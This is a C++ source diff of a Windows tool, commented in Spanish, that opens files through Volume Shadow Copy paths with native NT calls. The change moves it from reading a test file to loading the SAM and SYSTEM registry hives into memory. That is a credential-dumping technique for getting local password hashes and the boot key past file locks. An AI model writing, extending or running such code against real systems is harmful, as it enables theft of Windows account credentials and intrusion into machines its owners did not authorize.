@@ -8,6 +8,7 @@
 #include <vss.h>
 #include <vswriter.h>
 #include <vsbackup.h>
+#include <vector>
 
 #pragma comment(lib, "vssapi.lib")
 
@@ -409,20 +410,63 @@ BOOL ReadAndDisplayFileBytes(HANDLE fileHandle) {
         // Actualizar offset para siguiente lectura
         byteOffset.QuadPart += bytesRead;
 
-        printf("\n--- Leídos %lu bytes ---\n", bytesRead);
+        printf("\n--- Read %lu bytes ---\n", bytesRead);
     }
 
     return TRUE;
 }
 
 
-int read_file(const wchar_t* filePath) {
+std::vector<BYTE> ReadFileBytes(HANDLE fileHandle) {
+    std::vector<BYTE> fileContent;
+    BYTE buffer[4096];
+    IO_STATUS_BLOCK ioStatusBlock;
+    LARGE_INTEGER byteOffset = { 0 };
+
+    while (TRUE) {
+        NTSTATUS status = NtReadFile(
+            fileHandle,
+            NULL,
+            NULL,
+            NULL,
+            &ioStatusBlock,
+            buffer,
+            sizeof(buffer),
+            &byteOffset,
+            NULL
+        );
+
+        if (status != 0 && status != 0x00000103) {
+            if (status == 0x80000006) { // STATUS_END_OF_FILE
+                break;
+            }
+            printf("Error en lectura. Código NT: 0x%08X\n", status);
+            break;
+        }
+
+        DWORD bytesRead = (DWORD)ioStatusBlock.Information;
+
+        if (bytesRead == 0) {
+            break;
+        }
+
+        // Agregar bytes al vector en lugar de imprimirlos
+        fileContent.insert(fileContent.end(), buffer, buffer + bytesRead);
+
+        // Actualizar offset para siguiente lectura
+        byteOffset.QuadPart += bytesRead;
+    }
+
+    return fileContent;
+}
+
+
+std::vector<BYTE> read_file(const wchar_t* filePath) {
+    std::vector<BYTE> fileContent;
+
     // Inicializar funciones NT
     InitializeNTFunctions();
     printf("Funciones NTAPI inicializadas correctamente.\n");
-
-    // Ruta del archivo en formato nativo de NT
-    // const wchar_t* filePath = L"\\??\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy19\\temp\\test1.txt";
 
     printf("Intentando abrir: %ls\n", filePath);
 
@@ -430,23 +474,21 @@ int read_file(const wchar_t* filePath) {
     HANDLE fileHandle = OpenFileWithNT(filePath);
     if (!fileHandle) {
         printf("No se pudo abrir el archivo.\n");
-        return 1;
+        return fileContent; // vector vacío
     }
+
     printf("Archivo abierto correctamente. Handle: %p\n", fileHandle);
 
-    // Leer y mostrar bytes
-    if (ReadAndDisplayFileBytes(fileHandle)) {
-        printf("\nLectura completada exitosamente.\n");
-    }
-    else {
-        printf("\nError durante la lectura.\n");
-    }
+    // Leer bytes (sin imprimir)
+    fileContent = ReadFileBytes(fileHandle);
+
+    printf("Read %zu bytes.\n", fileContent.size());
 
     // Cerrar handle
     NtClose(fileHandle);
     printf("Handle del archivo cerrado.\n");
 
-    return 0;
+    return fileContent;
 }
 
 
@@ -485,16 +527,19 @@ int main() {
     }
 
     // std::wstring fullPath = basePath + L"\\windows\\system32\\config\\sam";
-    // // std::wstring fullPath = basePath + L"\\windows\\system32\\config\\system"; 
-    std::wstring fullPath = basePath + L"\\temp\\test1.txt";
-    size_t pos = fullPath.find(L"\\\\?\\");
+    // std::wstring fullPath = basePath + L"\\windows\\system32\\config\\system"; 
+    
+    size_t pos = basePath.find(L"\\\\?\\");
     if (pos != std::wstring::npos) {
-        fullPath.replace(pos, 4, L"\\??\\");
+        basePath.replace(pos, 4, L"\\??\\");
     }
 
-    const wchar_t* fullPath_wchar = fullPath.c_str();
+    std::wstring fullPathSam    = basePath + L"\\windows\\system32\\config\\sam";
+    std::wstring fullPathSystem = basePath + L"\\windows\\system32\\config\\system";
+    // std::wstring fullPath = basePath + L"\\temp\\test1.txt";
 
-    read_file(fullPath_wchar);
+    std::vector<BYTE> SamBytes      = read_file(fullPathSam.c_str());
+    std::vector<BYTE> SystemmBytes  = read_file(fullPathSystem.c_str());
 
     /*
     list_shadows();
